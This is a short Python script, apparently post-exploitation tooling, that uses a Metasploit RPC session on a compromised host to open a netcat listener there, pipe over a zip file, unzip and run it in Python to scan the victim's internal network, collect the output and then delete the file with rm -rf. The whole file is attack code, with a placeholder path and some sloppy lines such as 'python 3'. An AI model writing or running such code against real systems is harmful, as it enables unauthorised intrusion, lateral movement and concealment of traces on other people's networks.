from metasploit.msfrpc import MsfRpcClient
from subprocess import check_output
from random import randint

def file_name():
    return "Identifier.zip"



def remote_host_scan(client:MsfRpcClient, metasploitSessionNum:int):
    try:
        target_ip = client.sessions.list[metasploitSessionNum]["target_host"]
        shell = client.sessions.session(metasploitSessionNum)
        random_int = randint(50000, 65530)
        shell.write("nc -l {} > {}\n".format(random_int, file_name()))
        check_output("cat /bla/bla/bla/Identifier.zip | nc {} {}".format(target_ip, random_int), shell=True)
        shell.write("^C\n")
        shell.write("unzip {}\n".format(file_name()))
        shell.write("python 3\n")
        shell.write("import Identifier\n")
        shell.write("Identifier.scanCurrentNetwork()\n")
        output = shell.read()
        shell.write("rm -rf {}".format(file_name()))
        return 0, output
    except:
        return -1, "{}"


